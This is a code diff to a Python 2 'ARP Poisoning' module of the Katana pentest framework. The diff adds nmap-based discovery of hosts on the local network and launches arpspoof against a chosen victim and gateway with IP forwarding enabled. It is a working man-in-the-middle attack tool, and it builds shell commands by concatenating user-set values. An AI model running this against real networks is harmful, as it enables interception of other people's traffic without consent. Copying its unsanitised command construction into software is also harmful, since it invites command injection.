@@ -3,6 +3,7 @@
 # Module    : ARP Poisoning     #
 # Script by : RedToor           #
 # Date      : 26/08/2015        #
+# Version   : 2.0               #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core                   #
 from core.design import *       #
@@ -14,13 +15,19 @@ import sys                      #
 d=DESIGN()                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Libraries                     #
-import os
+from xml.dom import minidom
+import xml.etree.ElementTree as ET
+import multiprocessing
+import commands         
+import re
+import commands
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-defaultipv=MY_IP
+defaultipv="192.168.1.224" #MY_IP
 defaultgat=GATEWAY_ADR
-defaultint=INTERFACE_DEVICE
+defaultint="wlan0" #INTERFACE_DEVICE
+IPs=[]
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
  
 def run(para,parb,parc):
@@ -41,30 +48,49 @@ def arpp(run):
             d.option()
             d.descrip("target","yes","IP victim",defaultipv)
             d.descrip("gway","yes","Gateway-Router.",defaultgat)
-            d.descrip("inter","yes","Interface",defaultint)
+            d.descrip("iterce","yes","Interface",defaultint)
             d.helpAUX()
             if ping.conneted()!=False:
                 ping.interfaces(1)
                 ping.get_gateway(1)
                 ping.my_mac_address(1)
                 d.space()
-                ping.lan_ips(1)
+                if ping.conneted()!=False:
+                    commands.getoutput(NMAP_PATH+' -sn '+str(ping.myip())+'/24 -oX tmp/ips.xml > null')
+                    GateWay=ping.get_gateway(2)
+                    tree = ET.parse('tmp/ips.xml')
+                    root = tree.getroot()
+                    IPf=0
+                    counter=0
+                    IP=""
+                    for host in root.findall('host'):
+                        for hosted in host.findall('address'):
+                            if hosted.get('addrtype') == "ipv4":
+                                IPf=hosted.get('addr')
+                            else:
+                                if GateWay == IPf :
+                                    IPf=colors[8]+colors[4]+"{GW:"+IPf+"}"+colors[0]
+                                IPs.append(" "+IPf+" "+str(hosted.get('addr'))+" "+str(hosted.get('vendor')))
+                    print " "+colors[10]+colors[7]+" # \t IP \t\t MAC \t\t VENDOR         "+colors[0]
+
+                    for HOST in IPs:
+                        counter=counter+1               
+                        print " ["+str(counter)+"]"+HOST
+                    d.space()
+                    commands.getoutput('rm tmp/ips.xml > null')
             else:
                 print d.noconnect()
             print ""
             arpp(0)
         elif actions[0:10] == "set target":
-            defaultipv = actions[11:]
+            defaultipv=ping.update(defaultipv,actions,"target")
             d.change("target",defaultipv)
-            arpp(0)
         elif actions[0:8] == "set gway":
-            defaultgat = actions[9:]
+            defaultgat=ping.update(defaultgat,actions,"gway")
             d.change("gway",defaultgat)
-            arpp(0)
-        elif actions[0:10] == "set inter":
-            defaultint = actions[11:]
-            d.change("inter",defaultint)
-            arpp(0)
+        elif actions[0:10] == "set iterce":
+            defaultint=ping.update(defaultint,actions,"iterce")
+            d.change("iterce",defaultint)
         elif actions=="exit" or actions=="x":
             d.goodbye()
             exit()
@@ -73,21 +99,31 @@ def arpp(run):
         elif actions=="back" or actions=="b":
             return
             return
+        elif actions[0:5]=="save:":
+            ping.SaveVariable(secuence=actions, matrix=IPs)
         elif actions=="run"  or actions=="r":
             d.run()
             try:
                 print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
                 print " "+Alr+" Starting ARP Poisoning..."
                 try:
-                    os.system("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
-                except:
+                    t=multiprocessing.Process(target=Get_Poisoning)
+                    t.start()
+                    NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
                     print " "+Alr+" Stopping ARP Poisoning..."
-                    print " "+Alr+" forwarding in 0",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t\t')
-                    Errors.Errors(event=sys.exc_info()[0], info=False)
+                    print " "+Alr+" Setting Normal configuration in forwarding",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t')
+                    t.terminate() 
+                    d.space()
+                    arpp(0)
+                except:
+                    Errors.Errors(event=sys.exc_info(), info=False)
             except:
-                Errors.Errors(event=sys.exc_info()[0], info=False)
+                Errors.Errors(event=sys.exc_info(), info=False)
         else:
             d.No_actions()
     except:
-        Errors.Errors(event=sys.exc_info()[0], info=False)
+        Errors.Errors(event=sys.exc_info(), info=False)
     arpp(0)
+
+def Get_Poisoning():
+    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
